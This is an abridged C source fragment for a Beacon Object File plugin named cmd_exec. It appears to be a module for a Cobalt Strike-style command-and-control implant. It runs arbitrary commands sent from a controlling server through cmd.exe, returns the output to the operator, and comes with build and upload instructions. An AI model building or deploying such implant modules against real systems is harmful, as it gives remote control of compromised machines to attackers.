/*
 * cmd_exec.c - Generic command execution BOF plugin.
 *
 * Receives a command string via Beacon Data API, executes it via
 * CreateProcessA (cmd.exe /C <command>), and returns stdout/stderr
 * through BeaconOutput.
 *
 * Output is converted from the system's ACP (e.g. GBK/CP936) to UTF-8
 * before sending, so Chinese and other non-ASCII text displays correctly.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c cmd_exec.c -o cmd_exec.o
 *
 * Usage from server:
 *   Upload cmd_exec.o, set args = "whoami" or "ipconfig /all" etc.
 */
...
void go(char* args, int alen)
{
    ...
    /* Build: cmd.exe /C <user_command> */
    const char prefix[] = "cmd.exe /C ";
    int prefix_len = bof_strlen(prefix);

    if (prefix_len + user_cmd_len >= (int)sizeof(cmd_line) - 1) {
    ...
    cmd_line[prefix_len + user_cmd_len] = '\0';
    ...
    /* STARTUPINFO: redirect stdout + stderr */
